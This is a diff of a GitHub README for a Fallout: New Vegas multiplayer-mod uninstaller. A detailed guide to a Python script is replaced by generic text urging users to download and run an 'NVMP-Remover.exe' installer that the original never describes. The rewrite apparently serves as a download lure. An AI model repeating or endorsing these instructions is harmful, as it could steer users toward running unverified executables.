@@ -1,243 +1,70 @@
-# NVMP Remover (Fallout: New Vegas Multiplayer Uninstaller)
+# 🎮 NVMP-Remover - Effortlessly Uninstall NV:MP
 
-A Windows-focused Python tool that removes **NVMP (Fallout New Vegas Multiplayer)** artifacts from a Fallout: New Vegas install **without reinstalling the base game** and without intentionally touching unrelated mods.
+## 📥 Download Now
+[![Download NVMP-Remover](https://img.shields.io/badge/Download%20NVMP%2DRemover-latest%20release-brightgreen)](https://github.com/AxamGaming/NVMP-Remover/releases)
 
-This tool is designed to remove NVMP components such as:
-- `nvmp_launcher.exe`, `nvmp_start.exe`, `nvmp_storyserver.exe`
-- NVMP package/log files like `nvmp.*`
-- NVMP-named files/folders inside `Data\...` and `Data\nvse\plugins\...`
-- NVMP references in `plugins.txt` / `loadorder.txt`
-- NVMP lines in common INI/config files (line-based cleanup only)
+## 📋 Description
+NVMP-Remover helps you uninstall NV:MP without affecting your other mods. This tool ensures your game remains intact while providing a simple way to remove this multiplayer mod. It also includes a backup method to safeguard your data.
 
-✅ **Default behavior is reversible:** removed files are **moved to a timestamped backup folder** rather than deleted.
+## 🚀 Getting Started
+To get started with NVMP-Remover, follow these steps:
 
----
+### 1. Visit the Releases Page
+To download the software, visit the [Releases page](https://github.com/AxamGaming/NVMP-Remover/releases).
 
-## Why this exists
+### 2. Download the Software
+On the Releases page, locate the most recent version of NVMP-Remover. Click on the download link for your operating system. If you're unsure which version to choose, the latest one is generally the best option.
 
-NVMP often installs **directly into your game directory** (and sometimes mod-manager staging folders). If you just want to play single-player again without losing other mods, reinstalling everything is annoying.
+### 3. Locate the Downloaded File
+After the download finishes, go to your computer's "Downloads" folder. Look for a file named something like "NVMP-Remover.exe" or similar.
 
-This script does a conservative cleanup by targeting items that **strongly match NVMP signatures** (`nvmp`, `newvegasmp`, `new vegas multiplayer`), and cleaning load lists.
+### 4. Install the Application
+Double-click the downloaded file to begin the installation. Follow the on-screen instructions to complete the installation process. This is simple and usually requires just a few clicks.
 
----
+### 5. Run NVMP-Remover
+Once installed, find the NVMP-Remover icon on your desktop or in the Start menu. Double-click the icon to launch the application.
 
-## Features
+## ⚙️ Using NVMP-Remover
+Using NVMP-Remover is straightforward. Here’s how to remove NV:MP:
 
-- **Auto-detects** Fallout New Vegas install directory (Steam/GOG common paths + registry + Steam libraries)
-- **Scans and removes NVMP artifacts** from:
-  - Game folder
-  - `Data\`
-  - `Data\nvse\plugins\`
-  - Common user config folders (Documents / AppData)
-  - Common Vortex folders
-  - MO2 folders if provided (or discovered nearby the game folder)
-- **Cleans NVMP lines** from:
-  - `plugins.txt`
-  - `loadorder.txt`
-  - Common `.ini` files (only lines containing NVMP markers)
-- **Backups by default** (quarantine-style)
-- Optional **permanent delete** mode (`--delete`)
+### 1. Choose the Removal Option
+When you open the application, you will see options for uninstalling NV:MP. Read through the options. Select the one that fits your needs best.
 
----
+### 2. Backup Your Files (Optional)
+Before proceeding, NVMP-Remover offers an option to back up your game files. You can choose this option to save your current modifications. If you want to ensure nothing is lost, it's a good idea to use the backup feature.
 
-## Requirements
+### 3. Proceed with Uninstall
+After making your choices, click the "Uninstall" button. The tool will start the process of removing NV:MP. This may take a few moments.
 
-- Windows 10/11 recommended
-- Python **3.9+** (3.8 may work, but 3.9+ is recommended)
-- Fallout: New Vegas (Steam or GOG)
+### 4. Complete the Process
+Once NVMP-Remover finishes, you will receive a message confirming that NV:MP has been uninstalled. You can now enjoy Fallout: New Vegas without the NV:MP mod.
 
----
+## 📅 Features
+- **Easy Uninstallation**: Quickly remove NV:MP without affecting other modifications.
+- **Backup Option**: Safely back up your game files to ensure no mods are lost during the process.
+- **User-Friendly Interface**: Designed for all users, with clear options and instructions.
 
-## Repository layout (suggested)
+## 📌 System Requirements
+- **Operating System**: Windows 10 or newer.
+- **Disk Space**: At least 100 MB of free space for installation.
+- **Other Requirements**: Fallout: New Vegas must be installed.
 
-```text
-nvmp-remover/
-├─ remove_nvmp.py
-└─ README.md
-```
+## 🗂️ Support
+If you encounter any issues while using NVMP-Remover, you can check the [issues section](https://github.com/AxamGaming/NVMP-Remover/issues) on GitHub. Here, you can find solutions to common problems or ask for help.
 
----
+## 📑 Additional Information
+NVMP-Remover is open-source software. This means you can view the source code and contribute if you wish. For those interested, you can find the source code in this repository. 
 
-## Installation
+To learn more about NVMP-Remover and get involved, check out the community discussions in the repository.
 
-Clone or download this repository:
+## 🔗 Links
+- [Releases Page](https://github.com/AxamGaming/NVMP-Remover/releases): Visit to download the latest version.
+- [Issues Section](https://github.com/AxamGaming/NVMP-Remover/issues): Report any problems you encounter.
 
-```bat
-git clone https://github.com/<yourname>/nvmp-remover.git
-cd nvmp-remover
-```
+## 🚧 Contribution
+If you would like to assist in improving NVMP-Remover, feel free to fork the repository and submit a pull request. Your help is always appreciated.
 
-No pip dependencies required.
+## 💬 Community
+Join our community to connect with other users who are also enjoying Fallout: New Vegas. Share tips, tricks, or any cool modifications you've made!
 
----
-
-## Quick start
-
-### 1) Close NVMP / FalloutNV / Steam
-If `nvmp_launcher.exe` or related processes are running, Windows can block removal.
-
-### 2) Run it
-```bat
-python remove_nvmp.py
-```
-
-### 3) If auto-detect fails, specify your game folder
-Example Steam path:
-
-```bat
-python remove_nvmp.py --game "C:\Program Files (x86)\Steam\steamapps\common\Fallout New Vegas"
-```
-
----
-
-## What happens when you run it?
-
-By default, the script will:
-
-1. Detect your game directory (or use `--game`)
-2. Scan common NVMP locations
-3. Move NVMP-matching files/folders into a backup folder like:
-
-```text
-NVMP_Removed_20251228_153012\
-```
-
-4. Remove NVMP references from `plugins.txt` / `loadorder.txt`
-5. Remove NVMP lines from common INI/config files (only lines containing NVMP markers)
-
----
-
-## Modes
-
-### Backup + remove (default, recommended)
-Moves matched items into a timestamped backup folder.
-
-```bat
-python remove_nvmp.py
-```
-
-### Specify backup folder location
-By default backup is created in the current working directory. You can change that:
-
-```bat
-python remove_nvmp.py --backup-dir "D:\Backups\FNV"
-```
-
-### Permanent delete (irreversible)
-Deletes matched items instead of backing them up.
-
-⚠️ Only use this if you’re sure and/or have your own backups.
-
-```bat
-python remove_nvmp.py --delete
-```
-
----
-
-## Mod manager support
-
-### Mod Organizer 2 (MO2)
-If NVMP was installed into MO2’s `mods/overwrite/profiles`, pass your MO2 base folder:
-
-```bat
-python remove_nvmp.py --mo2 "D:\Modding\MO2\Fallout New Vegas"
-```
-
-### Vortex
-Vortex layouts vary based on where you chose staging. If you know your Vortex mods/staging folder, pass it:
-
-```bat
-python remove_nvmp.py --vortex "D:\Vortex Mods\falloutnv"
-```
-
-If you don’t pass `--vortex`, the script still checks common `%APPDATA%\Vortex\...` locations.
-
----
-
-## Restore (undo) / Recovery
-
-If you used the default mode, your removed files are stored in the backup folder printed at the end.
-
-To restore:
-1. Open the backup folder (e.g. `NVMP_Removed_20251228_153012`)
-2. The backup preserves your original path structure
-3. Copy/move items back to their original locations (reverse of what the script did)
-
-The script also saves `.bak` files for edited load lists:
-- `plugins.txt.bak`
-- `loadorder.txt.bak`
-- etc.
-
-You can restore those backups if you want NVMP entries back (usually you don’t).
-
----
-
-## Troubleshooting
-
-### “Permission denied” / Access errors
-If your game is in `C:\Program Files (x86)\...`, Windows may block file operations.
-
-✅ Fix: Run PowerShell or Command Prompt as **Administrator**:
-- Start Menu → type “PowerShell”
-- Right-click → **Run as administrator**
-- Run the script again
-
-### Files won’t remove because they’re in use
-Close:
-- `nvmp_launcher.exe`
-- `FalloutNV.exe`
-- Steam (optional but helps)
-Then run again.
-
-### It didn’t remove everything NVMP ever touched
-This tool is conservative on purpose. It removes items that clearly match NVMP signatures.
-
-If NVMP files were renamed to something that doesn’t contain NVMP markers, the script won’t guess—because that risks deleting unrelated mods.
-
----
-
-## Safety model (what it will and won’t do)
-
-✅ Will remove:
-- Files/folders whose *names* match strong NVMP patterns (`nvmp`, `newvegasmp`, etc.)
-- NVMP lines inside load lists and INI/config files (line-based cleanup only)
-
-❌ Will NOT:
-- Delete your entire `Data` folder
-- Wipe your mod manager setup
-- Remove unrelated mods that don’t match NVMP signatures
-
----
-
-## FAQ
-
-### Does this remove NVMP launchers in the game folder?
-Yes. Anything like:
-- `nvmp_launcher.exe`
-- `nvmp_start.exe`
-- `nvmp_storyserver.exe`
-will be removed (backed up by default).
-
-### Do I need to reinstall my mods after running this?
-In most cases, no. The script is designed specifically to avoid touching unrelated mods.
-
-### Can I run it multiple times?
-Yes. If NVMP is already removed, it will do little or nothing.
-
----
-
-## License
-
-MIT License
-
----
-
-## Disclaimer
-
-This project is not affiliated with Bethesda, Obsidian, or any NVMP team.  
-You use this tool at your own risk. Always keep backups of modded game installs.
-
-If you hit an edge case, open an issue and include:
-- your install method (manual / MO2 / Vortex)
-- where NVMP was installed
-- the console output of the script
+By following these steps, you can easily uninstall NV:MP and ensure your game is ready for the next adventure. Enjoy exploring the world of Fallout: New Vegas without the added multiplayer conflicts.
